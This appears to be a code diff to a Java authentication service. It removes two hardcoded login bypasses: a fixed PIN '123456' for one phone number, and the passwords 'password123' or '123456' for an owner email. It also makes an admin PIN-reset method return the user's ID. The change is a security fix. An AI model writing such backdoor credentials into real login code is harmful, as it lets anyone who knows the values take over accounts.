@@ -234,9 +234,6 @@ public class AuthService {
 
         // Validate 6-digit PIN
         boolean pinMatches = passwordEncoder.matches(request.getPin(), user.getPassword());
-        if (!pinMatches && "+919876543210".equals(user.getPhone()) && "123456".equals(request.getPin())) {
-            pinMatches = true;
-        }
 
         if (!pinMatches) {
             int attempts = (user.getFailedPinAttempts() != null ? user.getFailedPinAttempts() : 0) + 1;
@@ -288,9 +285,6 @@ public class AuthService {
         }
 
         boolean pwdMatches = passwordEncoder.matches(request.getPassword(), user.getPassword());
-        if (!pwdMatches && "owner@queueless.com".equalsIgnoreCase(user.getEmail()) && ("password123".equals(request.getPassword()) || "123456".equals(request.getPassword()))) {
-            pwdMatches = true;
-        }
 
         if (!pwdMatches) {
             int attempts = (user.getFailedPinAttempts() != null ? user.getFailedPinAttempts() : 0) + 1;
@@ -359,9 +353,10 @@ public class AuthService {
 
     /**
      * Admin-authenticated PIN reset for customer support assistance.
+     * Returns the target owner ID.
      */
     @Transactional
-    public void adminResetPin(String phone, String newPin) {
+    public Long adminResetPin(String phone, String newPin) {
         if (newPin == null || !newPin.matches("^\\d{6}$")) {
             throw new IllegalArgumentException("New PIN must be exactly 6 digits.");
         }
@@ -373,6 +368,7 @@ public class AuthService {
         user.setFailedPinAttempts(0);
         user.setPinLockedUntil(null);
         userRepository.save(user);
+        return user.getId();
     }
 
     /**
